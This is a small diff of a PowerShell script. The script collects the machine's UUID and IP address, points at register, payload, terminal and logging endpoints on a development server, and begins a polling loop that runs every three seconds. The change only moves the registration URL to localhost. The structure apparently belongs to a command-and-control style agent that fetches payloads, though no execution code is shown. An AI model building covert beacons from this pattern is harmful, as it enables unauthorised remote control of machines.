@@ -1,7 +1,7 @@
 $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
 # URL NEEDS TO BE CHANGED ONCE DEPLOYED
 
-$register_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/register/"
+$register_url = "http://127.0.0.1:8000/api/register/"
 
 $env:HostIP = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
 
@@ -19,6 +19,7 @@ $terminal_url = "http://dilkovak-ubuntuvm.mshome.net:8000/payloads/terminal_api/
 $script_log_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/script_log/"
 $terminal_log_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/terminal_log/"
 $payload_search_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/payload/?payload=&payload_name="
+
 
 while ($true) {
 	Start-Sleep -Seconds 3
